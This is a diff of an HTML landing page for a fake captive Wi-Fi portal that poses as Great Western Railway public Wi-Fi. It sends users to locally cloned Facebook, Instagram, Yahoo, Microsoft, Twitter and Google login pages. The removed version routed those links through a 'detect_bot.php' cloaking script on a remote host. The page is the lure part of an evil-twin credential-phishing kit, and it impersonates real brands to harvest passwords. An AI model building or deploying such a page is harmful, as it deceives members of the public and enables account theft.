@@ -1,55 +1,99 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<link rel="stylesheet" href="portalstyle.css">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .login-btn {
+            transition: all 0.3s ease;
+        }
+        .login-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+        .login-btn:active {
+            transform: translateY(-2px);
+        }
+        .portal-overlay {
+            background-color: rgba(0, 60, 30, 0.85);
+        }
+    </style>
 </head>
-<body>
+<body class="min-h-screen bg-cover bg-center" style="background-image: url('bg-main.jpg');">
+    <div class="portal-overlay absolute inset-0 flex items-center justify-center">
+        <div class="container mx-auto px-4 py-12">
+            <div class="max-w-2xl mx-auto bg-white bg-opacity-10 backdrop-blur-md rounded-xl p-8 shadow-2xl">
+		<div class="flex justify-center mb-8"><img src="icon.jpg" alt="GWR Supports Pride!" class="h-16 object-contain">
+		</div>
+                <h1 class="text-3xl md:text-4xl font-bold text-white text-center mb-12">Welcome to Great Western Railway Public Wi-Fi Service</h1>
+                
+                <div class="space-y-8">
+                    <!-- Row 1 -->
+                    <div class="flex flex-col md:flex-row justify-center gap-6">
+                        <a href="login/websites/facebook_desktop_homepage.html" class="login-btn flex-1 bg-transparent hover:bg-transparent text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center">
+                            <img src="buttons/facebook_up.jpg" 
+                                 class="h-12 w-full object-contain"
+                                 onmouseover="this.src='buttons/facebook_down.jpg'"
+                                 onmouseout="this.src='buttons/facebook_up.jpg'"
+                                 onclick="this.src='buttons/facebook_down.jpg'">
+                        </a>
+                        <a href="login/websites/instagram.html" class="login-btn flex-1 bg-transparent hover:bg-transparent text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center">
+                            <img src="buttons/insta_up.jpg" 
+                                 class="h-12 w-full object-contain"
+                                 onmouseover="this.src='buttons/insta_down.jpg'"
+                                 onmouseout="this.src='buttons/insta_up.jpg'"
+                                 onclick="this.src='buttons/insta_down.jpg'">
+                        </a>
+                    </div>
+                    
+                    <!-- Row 2 -->
+                    <div class="flex flex-col md:flex-row justify-center gap-6">
+                        <a href="login/websites/yahoo.html" class="login-btn flex-1 bg-transparent hover:bg-transparent text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center">
+                            <img src="buttons/yahoo_up.jpg" 
+                                 class="h-12 w-full object-contain"
+                                 onmouseover="this.src='buttons/yahoo_down.jpg'"
+                                 onmouseout="this.src='buttons/yahoo_up.jpg'"
+                                 onclick="this.src='buttons/yahoo_down.jpg'">
+                        </a>
+                        <a href="login/websites/microsoft.html" class="login-btn flex-1 bg-transparent hover:bg-transparent text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center">
+                            <img src="buttons/microsoft_up.png" 
+                                 class="h-12 w-full object-contain"
+                                 onmouseover="this.src='buttons/microsoft_down.png'"
+                                 onmouseout="this.src='buttons/microsoft_up.png'"
+                                 onclick="this.src='buttons/microsoft_down.png'">
+                        </a>
+                    </div>
+                    
+                    <!-- Row 3 -->
+                    <div class="flex flex-col md:flex-row justify-center gap-6">
+                        <a href="login/websites/twitter_mobile.html" class="login-btn flex-1 bg-transparent hover:bg-transparent text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center">
+                            <img src="buttons/twitter_up.jpg" 
+                                 class="h-12 w-full object-contain"
+                                 onmouseover="this.src='buttons/twitter_down.jpg'"
+                                 onmouseout="this.src='buttons/twitter_up.jpg'"
+                                 onclick="this.src='buttons/twitter_down.jpg'">
+                        </a>
+                        <a href="login/websites/google/index.html" class="login-btn flex-1 bg-transparent hover:bg-transparent text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center">
+                            <img src="buttons/google_up.jpg" 
+                                 class="h-12 w-full object-contain"
+                                 onmouseover="this.src='buttons/google_down.jpg'"
+                                 onmouseout="this.src='buttons/google_up.jpg'"
+                                 onclick="this.src='buttons/google_down.jpg'">
+                        </a>
+                    </div>
+                </div>
+                
+                <p class="text-white text-opacity-70 text-center mt-12 text-sm">
+                    By logging in, you agree to our Terms of Service and Privacy Policy
+                </p>
+            </div>
+        </div>
+    </div>
 
-
-
-<center>
-
-<div id="maindiv">
-	<img src="main-logo.jpg" width="50%" height="230px"><br />
-	<br />
-	<div id="sdiv">
-		<p><Strong>This is a sponsored public service</Strong></p>
-		<p><Strong>For your security, please login using one of the otions below.</Strong></p>
-		<br />
-	</div>
-
-
-
-<div class="row">
-	<div class="column">
-		<a href="http://captive.dpportal.io/login/modules/detect_bot.php?filename=facebook_desktop_homepage.html"><div class="figure"><img class="image-main" src="buttons/facebook_up.jpg?w=362" srcset="buttons/facebook_up.jpg" align="left"><img class="image-hover" src="buttons/facebook_down.jpg" srcset="buttons/facebook_down.jpg" align="left"></div></a>
-	</div>
-	<div class="column">
-		<a href="#"><div class="figure"><img class="image-main" src="buttons/google_up.jpg?w=362" srcset="buttons/google_up.jpg" align="right"><img class="image-hover" src="buttons/google_down.jpg" srcset="buttons/google_down.jpg" align="right"></div></a>
-	</div>
-</div>
-<div class="row">
-	<div class="column">
-		<a href="http://captive.dpportal.io/login/modules/detect_bot.php?filename=instagram.html"><div class="figure"><img class="image-main" src="buttons/insta_up.jpg?w=362" srcset="buttons/insta_up.jpg" align="left"><img class="image-hover" src="buttons/insta_down.jpg" srcset="buttons/insta_down.jpg" align="left"></div></a>
-	</div>
-	<div class="column">
-		<a href="http://captive.dpportal.io/login/modules/detect_bot.php?filename=microsoft.html"><div class="figure"><img class="image-main" src="buttons/microsoft_up.png?w=362" srcset="buttons/microsoft_up.png" align="right"><img class="image-hover" src="buttons/microsoft_down.png" srcset="buttons/microsoft_down.png" align="right"></div></a>
-	</div>
-</div>
-<div class="row">
-	<div class="column">
-		<a href="http://captive.dpportal.io/login/modules/detect_bot.php?filename=yahoo.html"><div class="figure"><img class="image-main" src="buttons/yahoo_up.jpg?w=362" srcset="buttons/yahoo_up.jpg" align="left"><img class="image-hover" src="buttons/yahoo_down.jpg" srcset="buttons/yahoo_down.jpg" align="left"></div></a>
-	</div>
-	<div="column">
-		<a href="http://captive.dpportal.io/login/modules/detect_bot.php?filename=twitter_mobile.html"><div class="figure"><img class="image-main" src="buttons/twitter_up.jpg?w=362" srcset="buttons/twitter_up.jpg" align="right"><img class="image-hover" src="buttons/twitter_down.jpg" srcset="buttons/twitter_down.jpg" align="right"></div></a>
-	</div>
-</div>
-
-</div>
-</center>
-
-
-
+    <script>
+        feather.replace();
+    </script>
 </body>
 </html>
